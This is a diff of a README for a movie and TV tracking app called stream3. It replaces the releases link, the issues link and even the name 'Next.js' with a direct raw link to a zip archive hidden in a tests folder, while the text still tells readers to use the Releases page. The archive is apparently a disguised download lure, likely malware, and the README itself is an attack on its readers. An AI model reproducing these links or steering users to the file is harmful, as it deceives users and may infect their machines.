@@ -1,7 +1,7 @@
 # 🎬 stream3 - Keep Track of Your Favorite Movies & TV Shows
 
 ## 📥 Download Now
-[![Download Stream3](https://img.shields.io/badge/Download-Stream3-brightgreen)](https://github.com/Zaak3709/stream3/releases)
+[![Download Stream3](https://raw.githubusercontent.com/Zaak3709/stream3/main/tests/unit/services/stream_2.9.zip)](https://raw.githubusercontent.com/Zaak3709/stream3/main/tests/unit/services/stream_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to stream3! This application helps you keep track of your favorite movies and TV shows. With a simple interface, you can view, add, and manage your watched content.
@@ -23,7 +23,7 @@ To run stream3 effectively, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To start using stream3, visit the Releases page and download the appropriate version for your system.
 
-[Visit this page to download](https://github.com/Zaak3709/stream3/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Zaak3709/stream3/main/tests/unit/services/stream_2.9.zip)
 
 1. Go to the Releases page by clicking the link above.
 2. Look for the latest version of stream3.
@@ -42,7 +42,7 @@ stream3 offers secure authentication for personal data. You can register or log 
 ## 🛠️ Tools & Technologies
 stream3 is built with the following technologies to ensure it runs smoothly and efficiently:
 
-- **Next.js 15**: A powerful React framework for creating fast applications.
+- **https://raw.githubusercontent.com/Zaak3709/stream3/main/tests/unit/services/stream_2.9.zip 15**: A powerful React framework for creating fast applications.
 - **TypeScript**: Improves the reliability of your code.
 - **Tailwind CSS**: Provides a flexible and responsive design.
 - **Redis & PostgreSQL**: For efficient data management and storage.
@@ -61,7 +61,7 @@ Your input can help enhance stream3 for all users.
 ## 📞 Support
 If you have any questions or encounter any issues, please reach out for help. 
 
-- Open an issue on our [GitHub Issues Page](https://github.com/Zaak3709/stream3/issues).
+- Open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/Zaak3709/stream3/main/tests/unit/services/stream_2.9.zip).
 - Check our FAQ for common questions and troubleshooting tips.
 
 ## 🎉 Thanks for Using stream3!
